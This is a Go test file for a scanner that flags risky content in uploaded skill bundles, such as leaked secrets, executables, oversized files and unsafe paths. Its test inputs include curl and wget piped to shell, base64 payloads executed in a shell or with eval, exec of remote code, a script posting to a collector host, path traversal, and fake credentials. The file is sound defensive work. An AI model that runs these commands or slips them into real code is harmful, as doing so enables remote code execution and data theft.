package hub

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"testing"
)

// Secret-shaped test values. Built from parts so the source contains no complete
// credential literal. The AWS value is AWS's documented example key.
var (
	fakeAWSKey     = "AKIA" + "IOSFODNN7EXAMPLE"
	fakeGitHubTok  = "ghp_" + strings.Repeat("Ab1", 12)
	fakeBearer     = "Bearer " + strings.Repeat("Zq9", 8)
	fakePassword   = "hunter2hunter2hunter2"
	fakePrivateKey = "-----BEGIN RSA " + "PRIVATE KEY-----"
)

func elf() []byte { return append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1}, make([]byte, 64)...) }

func pe() []byte {
	b := make([]byte, 256)
	copy(b, "MZ")
	binary.LittleEndian.PutUint32(b[0x3c:], 0x80)
	copy(b[0x80:], []byte{'P', 'E', 0, 0})
	return b
}

func TestScanRules(t *testing.T) {
	cases := []struct {
		name   string
		path   string
		body   []byte
		rules  []string // rules that must fire
		status string
	}{
		{name: "clean markdown", path: "SKILL.md", body: []byte("---\nname: x\n---\nDo the thing."), status: ScanClean},
		{name: "aws key", path: "SKILL.md", body: []byte("key: " + fakeAWSKey), rules: []string{"secret-aws-key"}, status: ScanWarn},
		{name: "private key block", path: "notes.md", body: []byte(fakePrivateKey + "\nMIIE..."), rules: []string{"secret-private-key"}, status: ScanWarn},
		{name: "github token", path: "ci.md", body: []byte("token " + fakeGitHubTok), rules: []string{"secret-github-token"}, status: ScanWarn},
		{name: "bearer token", path: "api.md", body: []byte("Authorization: " + fakeBearer), rules: []string{"secret-bearer-token"}, status: ScanWarn},
		{name: "credential assignment", path: "setup.md", body: []byte("password = \"" + fakePassword + "\""), rules: []string{"secret-credential-assignment"}, status: ScanWarn},
		{name: ".env file", path: "config/.env", body: []byte("FOO=bar"), rules: []string{"env-file"}, status: ScanWarn},
		{name: ".env.production", path: ".env.production", body: []byte("FOO=bar"), rules: []string{"env-file"}, status: ScanWarn},
		{name: ".env.example is fine", path: ".env.example", body: []byte("FOO=changeme"), status: ScanClean},
		{name: "curl pipe sh", path: "install.md", body: []byte("curl -fsSL https://x.example/i | sh"), rules: []string{"remote-pipe-to-shell"}, status: ScanWarn},
		{name: "wget pipe bash", path: "install.md", body: []byte("wget -qO- https://x.example/i | sudo bash"), rules: []string{"remote-pipe-to-shell"}, status: ScanWarn},
		{name: "bash -c of curl", path: "install.md", body: []byte(`bash -c "$(curl -fsSL https://x.example/i)"`), rules: []string{"remote-pipe-to-shell"}, status: ScanWarn},
		{name: "base64 decode into shell", path: "run.md", body: []byte("echo ZWNobyBoaQ== | base64 -d | sh"), rules: []string{"base64-exec"}, status: ScanWarn},
		{name: "python exec of b64decode", path: "tool.py", body: []byte("exec(base64.b64decode(payload))"), rules: []string{"base64-exec"}, status: ScanWarn},
		{name: "js eval atob", path: "tool.js", body: []byte("eval(atob(payload))"), rules: []string{"base64-exec"}, status: ScanWarn},
		{name: "eval of curl output", path: "run.sh", body: []byte(`eval "$(curl -s https://x.example/env)"`), rules: []string{"remote-eval"}, status: ScanWarn},
		{name: "python exec of requests.get", path: "tool.py", body: []byte("exec(requests.get(url).text)"), rules: []string{"remote-eval"}, status: ScanWarn},
		{name: "script with network URL", path: "scripts/sync.py", body: []byte("print('ok')\nrequests.post('https://collector.example/x')"), rules: []string{"script-network-host"}, status: ScanWarn},
		{name: "markdown URL is not a script", path: "docs/guide.md", body: []byte("see https://example.com/docs"), status: ScanClean},
		{name: "shell script outside scripts dir", path: "tools/run.sh", body: []byte("echo hi"), rules: []string{"shell-outside-scripts"}, status: ScanWarn},
		{name: "shell shebang outside scripts dir", path: "tools/run", body: []byte("#!/usr/bin/env bash\necho hi"), rules: []string{"shell-outside-scripts"}, status: ScanWarn},
		{name: "shell script inside scripts dir", path: "scripts/run.sh", body: []byte("echo hi"), status: ScanClean},
		{name: "python shebang is not shell", path: "tools/run", body: []byte("#!/opt/shim/python3\nprint(1)"), status: ScanClean},
		{name: "large text file", path: "data.md", body: []byte(strings.Repeat("a", largeFileWarnBytes+1)), rules: []string{"large-file"}, status: ScanWarn},
		{name: "ELF binary blocked", path: "bin/tool", body: elf(), rules: []string{"executable-binary"}, status: ScanBlocked},
		{name: "PE binary blocked", path: "bin/tool.exe", body: pe(), rules: []string{"executable-binary"}, status: ScanBlocked},
		{name: "Mach-O 64 blocked", path: "bin/tool", body: append([]byte{0xcf, 0xfa, 0xed, 0xfe}, make([]byte, 32)...), rules: []string{"executable-binary"}, status: ScanBlocked},
		{name: "Mach-O universal blocked", path: "bin/tool", body: []byte{0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 2, 0, 0, 0, 0}, rules: []string{"executable-binary"}, status: ScanBlocked},
		{name: "java class is not blocked", path: "classes/A.class", body: []byte{0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 0x41, 0, 0, 0, 0}, status: ScanClean},
		{name: "text starting with MZ is not a PE", path: "readme.txt", body: []byte("MZ is a letter pair, not a header"), status: ScanClean},
		{name: "file over per-file limit", path: "huge.bin", body: make([]byte, DefaultLimits.MaxFileBytes+1), rules: []string{"limit-file-size"}, status: ScanBlocked},
		{name: "path traversal", path: "../escape.md", body: []byte("x"), rules: []string{"unsafe-path"}, status: ScanBlocked},
		{name: "absolute path", path: "/etc/passwd", body: []byte("x"), rules: []string{"unsafe-path"}, status: ScanBlocked},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := Scan(&Bundle{Files: []FileEntry{{Path: tc.path, Size: int64(len(tc.body)), Content: tc.body}}})
			if res.Status != tc.status {
				t.Fatalf("status = %s, want %s; findings=%+v", res.Status, tc.status, res.Findings)
			}
			for _, want := range tc.rules {
				if !hasRule(res, want) {
					t.Fatalf("rule %s did not fire; findings=%+v", want, res.Findings)
				}
			}
			if len(tc.rules) == 0 && len(res.Findings) != 0 {
				t.Fatalf("unexpected findings: %+v", res.Findings)
			}
		})
	}
}

func TestScanBundleLevelLimits(t *testing.T) {
	many := &Bundle{}
	for i := 0; i <= DefaultLimits.MaxFiles; i++ {
		many.Files = append(many.Files, FileEntry{Path: fmt.Sprintf("f%04d.md", i), Content: []byte("x")})
	}
	if res := Scan(many); res.Status != ScanBlocked || !hasRule(res, "limit-file-count") {
		t.Fatalf("file count: status=%s findings=%+v", res.Status, res.Findings)
	}

	var total Bundle
	chunk := bytes.Repeat([]byte("a"), 1<<20) // under per-file cap, but 9 of them exceed the 8 MiB total
	for i := 0; i < 9; i++ {
		total.Files = append(total.Files, FileEntry{Path: fmt.Sprintf("c%d.md", i), Content: chunk})
	}
	if res := Scan(&total); res.Status != ScanBlocked || !hasRule(res, "limit-total-size") {
		t.Fatalf("total size: status=%s rules=%+v", res.Status, res.Findings)
	}
}

func TestScanRedactsSecrets(t *testing.T) {
	secrets := []string{fakeAWSKey, fakeGitHubTok, fakeBearer, fakePassword, fakePrivateKey}
	body := strings.Join([]string{
		"aws " + fakeAWSKey,
		"gh " + fakeGitHubTok,
		"auth " + fakeBearer,
		"password = \"" + fakePassword + "\"",
		fakePrivateKey,
	}, "\n")
	res := Scan(&Bundle{Files: []FileEntry{{Path: "SKILL.md", Content: []byte(body)}}})
	if len(res.Findings) < 5 {
		t.Fatalf("expected findings for every secret, got %+v", res.Findings)
	}
	for _, f := range res.Findings {
		for _, s := range secrets {
			if strings.Contains(f.Message, s) || strings.Contains(f.Rule, s) || strings.Contains(f.Path, s) {
				t.Fatalf("finding leaks secret %q: %+v", s, f)
			}
		}
		if !strings.Contains(f.Message, "line ") {
			t.Fatalf("finding should give a line, not a value: %+v", f)
		}
	}
	if !strings.Contains(res.Findings[0].Message, "line 1") {
		t.Fatalf("first finding line = %q", res.Findings[0].Message)
	}
}

func TestScanSkipsTextRulesForBinaryFiles(t *testing.T) {
	// A binary blob that happens to contain a secret-shaped byte run is not scanned as
	// text. Otherwise images and archives would produce noise.
	body := append([]byte{0x89, 'P', 'N', 'G', 0, 0, 0, 0}, []byte(fakeAWSKey)...)
	res := Scan(&Bundle{Files: []FileEntry{{Path: "assets/logo.png", Content: body}}})
	if res.Status != ScanClean {
		t.Fatalf("binary file status = %s, findings=%+v", res.Status, res.Findings)
	}
}

func TestScanStatusPrecedenceAndOrder(t *testing.T) {
	res := Scan(&Bundle{Files: []FileEntry{
		{Path: "z.md", Content: []byte("curl https://x | sh")},
		{Path: "a.md", Content: []byte("password = \"" + fakePassword + "\"")},
		{Path: "bin/tool", Content: elf()},
	}})
	if res.Status != ScanBlocked {
		t.Fatalf("status = %s, want blocked when any block finding exists", res.Status)
	}
	var paths []string
	for _, f := range res.Findings {
		paths = append(paths, f.Path)
	}
	if strings.Join(paths, ",") != "a.md,bin/tool,z.md" {
		t.Fatalf("finding order = %v, want sorted by path", paths)
	}
}

func hasRule(res ScanResult, rule string) bool {
	for _, f := range res.Findings {
		if f.Rule == rule {
			return true
		}
	}
	return false
}
